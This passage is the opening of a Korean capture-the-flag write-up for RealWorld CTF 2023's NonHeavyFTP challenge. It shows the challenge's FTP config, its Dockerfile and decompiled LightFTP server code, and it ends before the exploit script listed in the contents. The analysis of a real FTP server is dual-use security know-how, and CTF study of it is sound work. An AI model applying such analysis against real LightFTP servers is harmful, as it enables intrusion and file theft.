                    <a href="#analysis" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="nonheavyftp">NonHeavyFTP<a hidden class="anchor" aria-hidden="true" href="#nonheavyftp">#</a></h1>
<p><img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image.png" alt=""  />

난이도가 Baby인거 보고 달려들었는데, 어려웠다.</p>
<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
<pre tabindex="0"><code>[ftpconfig]
port=2121
maxusers=10000000
interface=0.0.0.0
local_mask=255.255.255.255

minport=30000
maxport=60000

goodbyemsg=Goodbye!
keepalive=1

[anonymous]
pswd=*
accs=readonly
root=/server/data/
</code></pre><p>ftp 서비스의 config 파일이다.</p>
<pre tabindex="0"><code>FROM ubuntu:22.04

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &amp;&amp;\
    apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid

RUN mkdir -p /server/data/ &amp;&amp;\
    echo &#34;hello from LightFTP&#34; &gt;&gt; /server/data/hello.txt &amp;&amp;\
    cd /server &amp;&amp;\
    wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &amp;&amp;\
    unzip LightFTP-2.2.zip &amp;&amp;\
    cd LightFTP-2.2/Source/Release &amp;&amp;\
    make &amp;&amp;\
    cp -a ./fftp /server/ &amp;&amp;\
    cd /server &amp;&amp;\
    rm -rf LightFTP-2.2 LightFTP-2.2.zip

COPY ./flag /flag
COPY ./fftp.conf /server/fftp.conf

RUN mv /flag /flag.`uuid` &amp;&amp;\
    useradd -M -d /server/ -U ftp

WORKDIR /server

EXPOSE 2121

CMD [&#34;runuser&#34;, &#34;-u&#34;, &#34;ftp&#34;, &#34;-g&#34;, &#34;ftp&#34;, &#34;/server/fftp&#34;, &#34;/server/fftp.conf&#34;]
</code></pre><p>/flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있다.
flag 파일의 이름을 알아내야할 필요가 있다.</p>
<p><a href="https://github.com/hfiref0x/LightFTP">https://github.com/hfiref0x/LightFTP</a>
그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다.
탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.</p>
<p>소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// r12
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// edi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v9; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v10; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v11; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_t</span> v12[<span style="color:#ae81ff">7</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-38h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v12[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">config_init</span>(<span style="color:#e6db74">&#34;fftp.conf&#34;</span>, argv, envp);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">config_init</span>(argv[<span style="color:#ae81ff">1</span>], argv, envp);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Could not find configuration file</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74"> Usage: fftp [CONFIGFILE]</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( g_log <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(g_log);
</span></span><span style="display:flex;"><span>LABEL_31:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ftp_tls_cleanup</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">x_malloc</span>(<span style="color:#f92672">&amp;</span>_data_start);
</span></span><span style="display:flex;"><span>  g_cfg <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)v4;
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v5;
</span></span><span style="display:flex;"><span>  in.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;interface&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    in.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(v6);
</span></span><span style="display:flex;"><span>  stru_1011C.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;external_ip&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    stru_1011C.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(v6);
</span></span><span style="display:flex;"><span>  stru_10120.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;255.255.255.0&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;local_mask&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    stru_10120.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(v6);
</span></span><span style="display:flex;"><span>  word_10110 <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;port&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    word_10110 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(v6, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  dword_10108 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;maxusers&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    dword_10108 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(v6, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  dword_1010C <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;keepalive&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    dword_1010C <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(v6, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  word_10112 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;minport&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    word_10112 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(v6, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  word_10114 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;maxport&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>    word_10114 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(v6, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;CATrustFile&#34;</span>, CAFILE, <span style="color:#ae81ff">4096LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;ServerCertificate&#34;</span>, CERTFILE, <span style="color:#ae81ff">4096LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;Keyfile&#34;</span>, KEYFILE, <span style="color:#ae81ff">4096LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;KeyfilePassword&#34;</span>, KEYFILE_PASS, <span style="color:#ae81ff">256LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;goodbyemsg&#34;</span>, GOODBYE_MSG, <span style="color:#ae81ff">128LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(v6, <span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">size_t</span>)<span style="color:#f92672">&amp;</span>_data_start);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>(v4, <span style="color:#e6db74">&#34;ftpconfig&#34;</span>, <span style="color:#e6db74">&#34;logfilepath&#34;</span>, v6, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    g_log <span style="color:#f92672">=</span> <span style="color:#a6e22e">open64</span>(v6, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">384LL</span>);
</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> g_log;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( g_log <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Error: Failed to open/create log file. Please check logfilepath: %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v6);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Possible errors: 1) path is invalid; 2) file is read only; 3) file is directory; 4) insufficient permissions</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>LABEL_28:
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(v4);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( g_log <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(g_log);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(v6);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_31;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;WARNING: logfilepath section is not found in configuration. Logging to file disabled.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> g_log;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( g_log <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>LABEL_22:
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">    [ LightFTP server v%s ]</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;2.2&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Log file        : %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v6);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">getcwd</span>(v6, (<span style="color:#66d9ef">size_t</span>)<span style="color:#f92672">&amp;</span>_data_start) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Working dir     : %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v6);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Config file     : %s/%s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v6, <span style="color:#e6db74">&#34;fftp.conf&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Config file     : %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>      v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_ntoa</span>(in);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Interface ipv4  : %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v8);
</span></span><span style="display:flex;"><span>      v9 <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_ntoa</span>(stru_10120);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Interface mask  : %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v9);
</span></span><span style="display:flex;"><span>      v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_ntoa</span>(stru_1011C);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;External ipv4   : %s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, v10);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Port            : %u</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)word_10110);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Max users       : %u</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_10108);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;PASV port range : %u..%u</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)word_10112, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)word_10114);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74"> TYPE q or Ctrl+C to terminate &gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ftp_tls_init</span>();
</span></span><span style="display:flex;"><span>      v12[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">pthread_create</span>(v12, <span style="color:#ae81ff">0LL</span>, ftpmain, <span style="color:#ae81ff">0LL</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;Error: Failed to create main server thread</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v11 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getc</span>(stdin);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( (v11 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFDF</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;Q&#39;</span> );
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_28;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">lseek64</span>(v7, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">goto</span> LABEL_22;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>그냥 서버에서 화면? status? 띄워주는 함수다.
클라이언트랑은 상관없으니까 패스하고, ftpmain 함수부터 보면된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftpmain</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// r12d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _DWORD <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// r15d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// r14
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> optval; <span style="color:#75715e">// [rsp+10h] [rbp-68h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">socklen_t</span> addr_len; <span style="color:#75715e">// [rsp+14h] [rbp-64h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">pthread_t</span> v11; <span style="color:#75715e">// [rsp+18h] [rbp-60h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> sockaddr addr; <span style="color:#75715e">// [rsp+20h] [rbp-58h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v13; <span style="color:#75715e">// [rsp+38h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v13 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__printf_chk</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74"> socket create error</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> v1;
</span></span><span style="display:flex;"><span>    optval <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setsockopt</span>(v1, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#f92672">&amp;</span>optval, <span style="color:#ae81ff">4u</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> (_DWORD <span style="color:#f92672">*</span>)<span style="color:#a6e22e">x_malloc</span>(<span style="color:#ae81ff">4LL</span> <span style="color:#f92672">*</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)dword_10108);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( dword_10108 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        v5 <span style="color:#f92672">=</span> v4<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        v3[v5] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( dword_10108 <span style="color:#f92672">&gt;</span> v4 );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    addr.sa_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
